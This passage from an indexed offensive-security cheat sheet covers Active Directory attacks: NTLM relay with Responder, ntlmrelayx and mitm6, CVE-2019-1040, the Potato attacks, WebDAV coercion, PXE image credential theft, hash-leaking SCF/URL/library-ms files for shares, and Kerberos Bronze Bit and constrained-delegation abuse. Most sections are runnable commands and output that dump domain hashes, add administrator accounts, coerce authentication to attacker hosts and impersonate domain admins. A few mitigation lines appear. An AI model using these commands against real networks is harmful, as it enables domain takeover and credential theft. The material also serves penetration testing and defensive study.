reflection","text":"<p>NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p> <p>This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim\u2019s own credentials.</p> <ul> <li>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068</li> </ul> <pre><code>msf &gt; use exploit/windows/smb/smb_relay\nmsf exploit(smb_relay) &gt; show targets\n</code></pre>"},{"location":"active-directory/internal-mitm-relay/#ldap-signing-not-required-and-ldap-channel-binding-disabled","title":"LDAP signing not required and LDAP channel binding disabled","text":"<p>During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:</p> <ul> <li>LDAP signing not required (by default set to <code>Not required</code>)</li> <li>LDAP channel binding is disabled. (by default disabled)</li> <li><code>ms-DS-MachineAccountQuota</code> needs to be at least at 1 for the account relayed (10 by default)</li> </ul> <p>Then we can use a tool to poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network such as <code>Responder</code> and use <code>ntlmrelayx</code> to add our computer.</p> <p><pre><code># On first terminal\nsudo ./Responder.py -I eth0 -wfrd -P -v\n\n# On second terminal\nsudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer\n</code></pre> It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.</p>"},{"location":"active-directory/internal-mitm-relay/#smb-signing-disabled-and-ipv4","title":"SMB Signing Disabled and IPv4","text":"<p>If a machine has <code>SMB signing</code>:<code>disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code>NTLMv2 hashes relay</code> and get a shell access on the machine. Also called LLMNR/NBNS Poisoning</p> <ol> <li>Open the Responder.conf file and set the value of <code>SMB</code> and <code>HTTP</code> to <code>Off</code>.     <pre><code>[Responder Core]\n; Servers to start\n...\nSMB = Off     # Turn this off\nHTTP = Off    # Turn this off\n</code></pre></li> <li>Run <code>python  RunFinger.py -i IP_Range</code> to detect machine with <code>SMB signing</code>:<code>disabled</code>.</li> <li>Run <code>python Responder.py -I &lt;interface_card&gt;</code> </li> <li>Use a relay tool such as <code>ntlmrelayx</code> or <code>MultiRelay</code><ul> <li><code>impacket-ntlmrelayx -tf targets.txt</code> to dump the SAM database of the targets in the list. </li> <li><code>python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code></li> </ul> </li> <li>ntlmrelayx can also act as a SOCK proxy with every compromised sessions.     <pre><code>$ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support\n[*] Servers started, waiting for connections\nType help for list of commands\nntlmrelayx&gt; socks\nProtocol  Target          Username                  Port\n--------  --------------  ------------------------  ----\nMSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433\nSMB       192.168.48.230  CONTOSO/NORMALUSER1       445\nMSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433\n\n# You might need to select a target with \"-t\"\n# smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://\nimpacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support\nimpacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support\n\n# the socks proxy can then be used with your Impacket tools or CrackMapExec\n$ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1\n$ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth\n$ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q \"SELECT 1\"   \n</code></pre></li> </ol> <p>Mitigations:</p> <ul> <li>Disable LLMNR via group policy     <pre><code>Open gpedit.msc and navigate to Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution and set to Enabled\n</code></pre></li> <li>Disable NBT-NS     <pre><code>This can be achieved by navigating through the GUI to Network card &gt; Properties &gt; IPv4 &gt; Advanced &gt; WINS and then under \"NetBIOS setting\" select Disable NetBIOS over TCP/IP\n</code></pre></li> </ul>"},{"location":"active-directory/internal-mitm-relay/#smb-signing-disabled-and-ipv6","title":"SMB Signing Disabled and IPv6","text":"<p>Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.</p> <pre><code>crackmapexec smb $hosts --gen-relay-list relay.txt\n\n# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6\n# -d is the domain name that we filter our request on - the attacked domain\n# -i is the interface we have mitm6 listen on for events\nmitm6 -i eth0 -d $domain\n\n# spoofing WPAD and relaying NTLM credentials\nimpacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt\nimpacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug\n\n# -ip is the interface you want the relay to run on\n# -wh is for WPAD host, specifying your wpad file to serve\n# -t is the target where you want to relay to. \nimpacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2\n</code></pre>"},{"location":"active-directory/internal-mitm-relay/#drop-the-mic","title":"Drop the MIC","text":"<p>The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP</p> <p>Check vulnerability with cve-2019-1040-scanner</p> <pre><code>python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'\n[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth\n[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)\n</code></pre> <ul> <li> <p>Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD     <pre><code>TERM1&gt; python printerbug.py testsegment.local/username@s2012exc.testsegment.local &lt;attacker ip/hostname&gt;\nTERM2&gt; ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support\nTERM1&gt; secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc\n</code></pre></p> </li> <li> <p>Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.</p> <pre><code># create a new machine account\nTERM1&gt; ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support \nTERM2&gt; python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6\nTERM1&gt; getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME\n\n# connect using the ticket\nexport KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache\nsecretsdump.py -k -no-pass second-dc-server.local -just-dc\n</code></pre> </li> </ul>"},{"location":"active-directory/internal-mitm-relay/#ghost-potato-cve-2019-1384","title":"Ghost Potato - CVE-2019-1384","text":"<p>Requirements:</p> <ul> <li>User must be a member of the local Administrators group</li> <li>User must be a member of the Backup Operators group</li> <li>Token must be elevated</li> </ul> <p>Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip</p> <pre><code>ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe\n</code></pre>"},{"location":"active-directory/internal-mitm-relay/#remotepotato0-dcom-dce-rpc-relay","title":"RemotePotato0 DCOM DCE RPC relay","text":"<p>It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine</p> <p>Requirements:</p> <ul> <li>a shell in session 0 (e.g. WinRm shell or SSH shell)</li> <li>a privileged user is logged on in the session 1 (e.g. a Domain Admin user)</li> </ul> <pre><code># https://github.com/antonioCoco/RemotePotato0/\nTerminal&gt; sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &amp; # Can be omitted for Windows Server &lt;= 2016\nTerminal&gt; sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1\nSession0&gt; RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2\nTerminal&gt; psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'\n</code></pre>"},{"location":"active-directory/internal-mitm-relay/#dns-poisonning-relay-delegation-with-mitm6","title":"DNS Poisonning - Relay delegation with mitm6","text":"<p>Requirements: </p> <ul> <li>IPv6 enabled (Windows prefers IPV6 over IPv4)</li> <li>LDAP over TLS (LDAPS)</li> </ul> <p>ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.</p> <pre><code>git clone https://github.com/fox-it/mitm6.git \ncd /opt/tools/mitm6\npip install .\n\nmitm6 -hw ws02 -d lab.local --ignore-nofqnd\n# -d: the domain name that we filter our request on (the attacked domain)\n# -i: the interface we have mitm6 listen on for events\n# -hw: host whitelist\n\nntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad\nntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer\n# -ip: the interface you want the relay to run on\n# -wh: WPAD host, specifying your wpad file to serve\n# -t: the target where you want to relay to\n\n# now granting delegation rights and then do a RBCD\nntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad\ngetST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate Administrator  \nexport KRB5CCNAME=administrator.ccache  \nsecretsdump.py -k -no-pass target.lab.local  \n</code></pre>"},{"location":"active-directory/internal-mitm-relay/#relaying-with-webdav-trick","title":"Relaying with WebDav Trick","text":"<p>Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB</p> <p>Requirement:</p> <ul> <li>WebClient service</li> </ul> <p>Exploitation:</p> <ul> <li>Disable HTTP in Responder: <code>sudo vi /usr/share/responder/Responder.conf</code></li> <li>Generate a Windows machine name: <code>sudo responder -I eth0</code>, e.g: WIN-UBNW4FI3AP0</li> <li>Prepare for RBCD against the DC: <code>python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support</code></li> <li>Discover WebDAV services     <pre><code>webclientservicescanner 'domain.local'/'user':'password'@'machine'\ncrackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav\nGetWebDAVStatus.exe 'machine'\n</code></pre></li> <li>Trigger the authentication to relay to our nltmrelayx: <code>PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4</code>, the listener host must be specified with the FQDN or full netbios name like <code>logger.domain.local@80/test.txt</code>. Specifying the IP results in anonymous auth instead of System.    <pre><code># PrinterBug\ndementor.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nSpoolSample.exe \"ATTACKER_IP\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\"\n\n# PetitPotam\nPetitpotam.py \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nPetitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nPetitPotam.exe \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\n</code></pre></li> <li>Use the created account to ask for a service ticket:      <pre><code>.\\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l&lt;i$;UzD7W'\n.\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt\nls \\\\PC1.purple.lab\\c$\n# IP of PC1: 10.0.0.4\n</code></pre></li> </ul>"},{"location":"active-directory/internal-mitm-relay/#man-in-the-middle-rdp-connections-with-pyrdp-mitm","title":"Man-in-the-middle RDP connections with pyrdp-mitm","text":"<ul> <li>https://github.com/GoSecure/pyrdp</li> <li>https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/</li> </ul> <p>Usage</p> <pre><code>pyrdp-mitm.py &lt;IP&gt;\npyrdp-mitp.py &lt;IP&gt;:&lt;PORT&gt; # with custom port\npyrdp-mitm.py &lt;IP&gt; -k private_key.pem -c certificate.pem # with custom key and certificate\n</code></pre> <p>Exploitation</p> <ul> <li>If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge</li> <li>If NLA is disabled, you will obtain the password in plaintext</li> <li>Other features are available such as keystroke recording</li> </ul> <p>Alternatives</p> <ul> <li>S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener    </li> </ul>"},{"location":"active-directory/internal-mitm-relay/#references","title":"References","text":"<ul> <li>Playing with Relayed Credentials - June 27, 2018</li> <li>Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</li> <li>Lateral Movement \u2013 WebClient</li> <li>Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</li> <li>Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher</li> </ul>"},{"location":"active-directory/internal-pxe-boot-image/","title":"Internal - PXE Boot Image","text":"<p>PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.</p> <ul> <li>Press [F8] during the PXE boot to spawn an administrator console on the deployed machine.</li> <li> <p>Press [SHIFT+F10] during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.</p> <pre><code>net user hacker Password123! /add\nnet localgroup administrators /add hacker\n</code></pre> </li> <li> <p>Extract the pre-boot image (wim files) using PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.</p> <pre><code># Import the module\nPS &gt; Import-Module .\\PowerPXE.ps1\n\n# Start the exploit on the Ethernet interface\nPS &gt; Get-PXEcreds -InterfaceAlias Ethernet\nPS &gt; Get-PXECreds -InterfaceAlias \u00ab lab 0 \u00bb \n\n# Wait for the DHCP to get an address\n&gt;&gt; Get a valid IP address\n&gt;&gt;&gt; &gt;&gt;&gt; DHCP proposal IP address: 192.168.22.101\n&gt;&gt;&gt; &gt;&gt;&gt; DHCP Validation: DHCPACK\n&gt;&gt;&gt; &gt;&gt;&gt; IP address configured: 192.168.22.101\n\n# Extract BCD path from the DHCP response\n&gt;&gt; Request BCD File path\n&gt;&gt;&gt; &gt;&gt;&gt; BCD File path:  \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd\n&gt;&gt;&gt; &gt;&gt;&gt; TFTP IP Address:  192.168.22.3\n\n# Download the BCD file and extract wim files\n&gt;&gt; Launch TFTP download\n&gt;&gt;&gt;&gt; Transfer succeeded.\n&gt;&gt; Parse the BCD file: conf.bcd\n&gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim\n&gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim\n&gt;&gt; Launch TFTP download\n&gt;&gt;&gt;&gt; Transfer succeeded.\n\n# Parse wim files to find interesting data\n&gt;&gt; Open LiteTouchPE_x86.wim\n&gt;&gt;&gt;&gt; Finding Bootstrap.ini\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\\\LAB-MDT\\DeploymentShare$\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = MdtService\n&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = Somepass1\n</code></pre> </li> </ul>"},{"location":"active-directory/internal-pxe-boot-image/#references","title":"References","text":"<ul> <li>Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling</li> <li>COMPROMISSION DES POSTES DE TRAVAIL GR\u00c2CE \u00c0 LAPS ET PXE MISC n\u00b0 103 - mai 2019 - R\u00e9mi Escourrou, Cyprien Oger </li> </ul>"},{"location":"active-directory/internal-shares/","title":"Internal - Shares","text":""},{"location":"active-directory/internal-shares/#read-permission","title":"READ Permission","text":"<p>Some shares can be accessible without authentication, explore them to find some juicy files</p> <ul> <li> <p>ShawnDEvans/smbmap - a handy SMB enumeration tool <pre><code>smbmap -H 10.10.10.10                # null session\nsmbmap -H 10.10.10.10 -r PATH        # recursive listing\nsmbmap -H 10.10.10.10 -u invaliduser # guest smb session\nsmbmap -H 10.10.10.10 -d \"DOMAIN.LOCAL\" -u \"USERNAME\" -p \"Password123*\"\n</code></pre></p> </li> <li> <p>byt3bl33d3r/pth-smbclient from path-toolkit <pre><code>pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/Share\npth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/C$\nls  # list files\ncd  # move inside a folder\nget # download files\nput # replace a file\n</code></pre></p> </li> <li> <p>SecureAuthCorp/smbclient from Impacket <pre><code>smbclient -I 10.10.10.100 -L ACTIVE -N -U \"\"\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share\n        Replication     Disk      \n        SYSVOL          Disk      Logon server share\n        Users           Disk\nuse Sharename # select a Sharename\ncd Folder     # move inside a folder\nls            # list files\n</code></pre></p> </li> <li> <p>smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers <pre><code>smbclient -U username //10.0.0.1/SYSVOL\nsmbclient //10.0.0.1/Share\n\n# Download a folder recursively\nsmb: \\&gt; mask \"\"\nsmb: \\&gt; recurse ON\nsmb: \\&gt; prompt OFF\nsmb: \\&gt; lcd '/path/to/go/'\nsmb: \\&gt; mget *\n</code></pre></p> </li> <li> <p>SnaffCon/Snaffler - a tool for pentesters to help find delicious candy <pre><code>snaffler.exe -s - snaffler.log\n\n# Snaffle all the computers in the domain\n./Snaffler.exe -d domain.local -c &lt;DC&gt; -s\n\n# Snaffle specific computers\n./Snaffler.exe -n computer1,computer2 -s\n\u200b\n# Snaffle a specific directory\n./Snaffler.exe -i C:\\ -s\n</code></pre></p> </li> </ul>"},{"location":"active-directory/internal-shares/#write-permission","title":"WRITE Permission","text":"<p>Write SCF and URL files on a writeable share to farm for user's hashes and eventually replay them.</p> <p>Theses attacks can be automated with Farmer.exe and Crop.exe</p> <pre><code># Farmer to receive auth\nfarmer.exe &lt;port&gt; [seconds] [output]\nfarmer.exe 8888 0 c:\\windows\\temp\\test.tmp # undefinitely\nfarmer.exe 8888 60 # one minute\n\n# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks\ncrop.exe &lt;output folder&gt; &lt;output filename&gt; &lt;WebDAV server&gt; &lt;LNK value&gt; [options]\nCrop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico\nCrop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec\n</code></pre>"},{"location":"active-directory/internal-shares/#scf-files","title":"SCF Files","text":"<p>Drop the following <code>@something.scf</code> file inside a share and start listening with Responder : <code>responder -wrf --lm -v -I eth0</code></p> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\10.10.10.10\\Share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <p>Using <code>crackmapexec</code>:</p> <pre><code>crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf\ncrackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk\ncrackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP\n</code></pre>"},{"location":"active-directory/internal-shares/#url-files","title":"URL Files","text":"<p>This attack also works with <code>.url</code> files and <code>responder -I eth0 -v</code>.</p> <pre><code>[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\10.10.10.10\\%USERNAME%.icon\nIconIndex=1\n</code></pre>"},{"location":"active-directory/internal-shares/#windows-library-files","title":"Windows Library Files","text":"<p>Windows Library Files (.library-ms)</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"&lt;http://schemas.microsoft.com/windows/2009/library&gt;\"&gt;\n  &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n  &lt;version&gt;6&lt;/version&gt;\n  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n  &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n  &lt;templateInfo&gt;\n    &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n  &lt;/templateInfo&gt;\n  &lt;searchConnectorDescriptionList&gt;\n    &lt;searchConnectorDescription&gt;\n      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n      &lt;isSupported&gt;false&lt;/isSupported&gt;\n      &lt;simpleLocation&gt;\n        &lt;url&gt;\\\\\\\\workstation@8888\\\\folder&lt;/url&gt;\n      &lt;/simpleLocation&gt;\n    &lt;/searchConnectorDescription&gt;\n  &lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre>"},{"location":"active-directory/internal-shares/#windows-search-connectors-files","title":"Windows Search Connectors Files","text":"<p>Windows Search Connectors (.searchConnector-ms)</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;searchConnectorDescription xmlns=\"&lt;http://schemas.microsoft.com/windows/2009/searchConnector&gt;\"&gt;\n    &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt;\n    &lt;description&gt;Microsoft Outlook&lt;/description&gt;\n    &lt;isSearchOnlyItem&gt;false&lt;/isSearchOnlyItem&gt;\n    &lt;includeInStartMenuScope&gt;true&lt;/includeInStartMenuScope&gt;\n    &lt;iconReference&gt;\\\\\\\\workstation@8888\\\\folder.ico&lt;/iconReference&gt;\n    &lt;templateInfo&gt;\n        &lt;folderType&gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}&lt;/folderType&gt;\n    &lt;/templateInfo&gt;\n    &lt;simpleLocation&gt;\n        &lt;url&gt;\\\\\\\\workstation@8888\\\\folder&lt;/url&gt;\n    &lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n</code></pre>"},{"location":"active-directory/internal-shares/#references","title":"References","text":"<ul> <li>SMB Share \u2013 SCF File Attacks - December 13, 2017 - @netbiosX</li> </ul>"},{"location":"active-directory/kerberos-bronze-bit/","title":"Kerberos - Bronze Bit","text":"<p>CVE-2020-17049</p> <p>An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated.</p> <p>Patch is out on November 10, 2020, DC are most likely vulnerable until February 2021.</p> <p> Patched Error Message : <code>[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)</code></p> <p>Requirements:</p> <ul> <li>Service account's password hash </li> <li>Service account's with <code>Constrained Delegation</code> or <code>Resource Based Constrained Delegation</code></li> <li>Impacket PR #1013 </li> </ul> <p>Attack #1 - Bypass the <code>Trust this user for delegation to specified services only \u2013 Use Kerberos only</code> protection and impersonate a user who is protected from delegation.</p> <pre><code># forwardable flag is only protected by the ticket encryption which uses the service account's password \n$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes &lt;LM:NTLM hash&gt; -aesKey &lt;AES hash&gt; test.local/Service1 -force-forwardable -dc-ip &lt;Domain controller&gt; # -&gt; Forwardable\n\n$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable\n\n# Load the ticket\n.\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit\n\n# Access \"c$\"\nls \\\\service2.test.local\\c$\n</code></pre> <p>Attack #2 - Write Permissions to one or more objects in the AD * Windows/Linux:     <pre><code>bloodyAD -u user -p 'totoTOTOtoto1234*' -d test.local --host 10.100.10.5 add computer AttackerService 'AttackerServicePassword'\nbloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d test.local add rbcd 'Service2$' 'AttackerService$'\n\n# Execute the attack\ngetST.py -spn cifs/Service2.test.local -impersonate User2 -dc-ip 10.100.10.5 -force-forwardable 'test.local/AttackerService$:AttackerServicePassword'\n</code></pre> * Windows only:     <pre><code># Create a new machine account\nImport-Module .\\Powermad\\powermad.ps1\nNew-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)\n.\\mimikatz\\mimikatz.exe \"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\" exit\n\n# Set PrincipalsAllowedToDelegateToAccount\nInstall-WindowsFeature RSAT-AD-PowerShell\nImport-Module ActiveDirectory\nGet-ADComputer AttackerService\nSet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$\nGet-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount\n\n# Execute the attack\npython .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardable\n\n# Load the ticket\n.\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit | Out-Null\n</code></pre></p>"},{"location":"active-directory/kerberos-bronze-bit/#references","title":"References","text":"<ul> <li>CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Practical Exploitation - Jake Karnes - December 8th, 2020</li> <li>CVE-2020-17049: Kerberos Bronze Bit Attack \u2013 Theory - Jake Karnes - December 8th, 2020</li> <li>Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory</li> </ul>"},{"location":"active-directory/kerberos-delegation-constrained/","title":"Kerberos Delegation - Constrained Delegation","text":"<p>Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.</p>"},{"location":"active-directory/kerberos-delegation-constrained/#identify-a-constrained-delegation","title":"Identify a Constrained Delegation","text":"<ul> <li>BloodHound: <code>MATCH p = (a)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN p</code></li> <li>PowerView: <code>Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft</code></li> <li>Native   <pre><code>Get-DomainComputer -TrustedToAuth | select -exp dnshostname\nGet-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo\n</code></pre></li> <li>bloodyAD:   <pre><code>bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' --attr sAMAccountName,msds-allowedtodelegateto\n</code></pre></li> </ul>"},{"location":"active-directory/kerberos-delegation-constrained/#exploit-the-constrained-delegation","title":"Exploit the Constrained Delegation","text":"<ul> <li> <p>Impacket   <pre><code>getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10\n</code></pre></p> </li> <li> <p>Rubeus: S4U2 attack (S4U2self + S4U2proxy)   <pre><code># with a password\nRubeus.exe s4u /nowrap /msdsspn:\"time/target.local\" /altservice:cifs /impersonateuser:\"administrator\" /domain:\"domain\" /user:\"user\" /password:\"password\"\n\n# with a NT hash\nRubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt\nRubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:\"cifs/dc.domain.com\" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt\ndir \\\\dc.domain.com\\c$\n</code></pre></p> </li> <li> <p>Rubeus: use an existing ticket to perform a S4U2 attack to impersonate the \"Administrator\"   <pre><code># Dump ticket\nRubeus.exe tgtdeleg /nowrap\nRubeus.exe triage\nRubeus.exe dump /luid:0x12d1f7\n\n# Create a ticket\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt\n</code></pre></p> </li> <li> <p>Rubeus : using aes256 keys   <pre><code># Get aes256 keys of the machine account\nprivilege::debug\ntoken::elevate\nsekurlsa::ekeys\n\n# Create a ticket\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt\n</code></pre></p> </li> </ul>"},{"location":"active-directory/kerberos-delegation-constrained/#impersonate-a-domain-user-on-a-resource","title":"Impersonate a domain user on a resource","text":"<p>Require: * SYSTEM level privileges on a machine configured with constrained delegation</p> <pre><code>PS&gt; 